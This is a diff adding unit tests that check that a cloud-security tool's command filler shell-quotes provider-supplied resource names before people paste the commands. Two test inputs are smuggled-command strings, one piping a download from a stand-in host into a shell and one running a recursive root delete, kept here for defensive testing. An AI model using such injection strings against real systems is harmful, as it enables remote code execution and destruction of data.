@@ -57,3 +57,66 @@ describe("filling a fix command from its resource", () => {
     expect(filled).toEqual([]);
   });
 });
+
+describe("quoting what came out of somebody else's cloud", () => {
+  // CloudGuard does not run these commands; it hands them to a person who
+  // pastes them into a shell. The values in them are provider-supplied
+  // strings, so the quoting is this file's problem or nobody's.
+
+  it("leaves an ordinary identifier exactly as the rule wrote it", () => {
+    const { text } = fillPlaceholders("az group show --name <rg>", { rg: "rg-data_01.prod" });
+
+    expect(text).toBe("az group show --name rg-data_01.prod");
+  });
+
+  it("quotes a name that is more than one shell word", () => {
+    const { text, filled } = fillPlaceholders("az group show --name <rg>", {
+      rg: "rg (west europe)",
+    });
+
+    expect(text).toBe("az group show --name 'rg (west europe)'");
+    expect(filled).toEqual(["rg"]);
+  });
+
+  it("neutralises a name that tries to end the command", () => {
+    const { text } = fillPlaceholders(
+      "az storage account update --name <account> --allow-blob-public-access false",
+      { account: "st; curl evil.example/x | sh" },
+    );
+
+    expect(text).toBe(
+      "az storage account update --name 'st; curl evil.example/x | sh' --allow-blob-public-access false",
+    );
+    // Everything after the name is one quoted argument, so no shell
+    // metacharacter in it is a metacharacter any more.
+    expect(text).not.toMatch(/--name st; curl/);
+  });
+
+  it("breaks an embedded single quote out of the quoting", () => {
+    const { text } = fillPlaceholders("az group show --name <rg>", {
+      rg: "rg'; rm -rf /; echo '",
+    });
+
+    expect(text).toBe("az group show --name 'rg'\\''; rm -rf /; echo '\\'''");
+  });
+
+  it("leaves a placeholder inside a quoted argument unfilled rather than nesting quotes", () => {
+    // Quoting here would produce a command that is wrong rather than one that
+    // is dangerous, and a bracket asks the reader for a value they can supply.
+    const command =
+      'aws s3api put-bucket-logging --bucket <bucket> --bucket-logging-status \'{"TargetBucket":"<bucket>"}\'';
+    const { text, filled } = fillPlaceholders(command, { bucket: "logs bucket" });
+
+    expect(text).toBe(
+      'aws s3api put-bucket-logging --bucket \'logs bucket\' --bucket-logging-status \'{"TargetBucket":"<bucket>"}\'',
+    );
+    expect(filled).toEqual(["bucket"]);
+  });
+
+  it("still fills a quoted position when the value needs no quoting", () => {
+    const command = 'aws s3api put-bucket-logging --bucket-logging-status \'{"TargetBucket":"<bucket>"}\'';
+    const { text } = fillPlaceholders(command, { bucket: "cg-logs" });
+
+    expect(text).toBe('aws s3api put-bucket-logging --bucket-logging-status \'{"TargetBucket":"cg-logs"}\'');
+  });
+});
